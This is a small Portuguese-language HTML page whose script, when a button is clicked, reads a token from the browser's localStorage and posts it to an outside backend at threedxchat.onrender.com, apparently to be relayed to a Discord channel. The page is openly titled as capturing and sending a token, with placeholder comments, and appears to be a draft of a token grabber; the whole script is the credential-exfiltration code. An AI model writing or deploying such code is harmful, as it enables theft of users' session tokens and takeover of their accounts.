<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enviar Token para Discord</title>
</head>
<body>
    <h1>Capturar e Enviar Token para Discord</h1>
    <button id="captureTokenBtn">Capturar Token e Enviar</button>

    <script>
        document.getElementById('captureTokenBtn').addEventListener('click', function() {
            // Captura o token (substitua isso com o método correto de captura)
            const token = localStorage.getItem('yourToken');  // Exemplo de token vindo do localStorage

            // Verifica se o token foi capturado
            console.log('Token capturado:', token);  // Adicione logs para depurar

            if (token) {
                // Envia a requisição POST para o backend
                fetch('https://threedxchat.onrender.com/send-to-discord', {  // Substitua pela URL do seu backend
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        message: `Token capturado: ${token}`  // Envia a mensagem para o Discord
                    }),
                })
                .then(response => {
                    if (response.ok) {
                        console.log('Token enviado com sucesso!');
                        alert('Token enviado com sucesso!');
                    } else {
                        console.error('Falha ao enviar token:', response.status);
                        alert('Falha ao enviar token.');
                    }
                })
                .catch(error => {
                    console.error('Erro:', error);
                    alert('Erro ao enviar token.');
                });
            } else {
                console.error('Token não encontrado!');
                alert('Token não encontrado!');
            }
        });
    </script>
</body>
</html>
